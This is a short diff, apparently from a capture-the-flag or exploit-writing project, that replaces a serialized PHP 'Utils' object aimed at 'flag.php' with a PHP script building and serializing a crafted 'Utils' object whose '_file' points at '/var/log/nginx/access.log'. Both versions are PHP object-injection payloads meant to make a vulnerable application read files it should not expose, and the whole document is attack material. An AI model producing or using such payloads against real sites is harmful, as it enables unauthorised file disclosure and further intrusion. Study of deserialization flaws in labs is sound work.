@@ -1,1 +1,11 @@
-O:5:"Utils":4:{s:5:"_file";s:8:"flag.php";s:3:"_id";i:12342534;s:5:"_host";s:5:"local";s:7:"_result";s:6:"asdqwe";}
+<?php
+class Utils {};
+$a = new Utils;
+$a->_file = "/var/log/nginx/access.log";
+$a->_id = "345849012";
+$a->_host = "vimeo";
+$a->title = "asd";
+$a->description = "asd";
+$a->thumbnail_small = "asd";
+echo serialize($a);
+?>
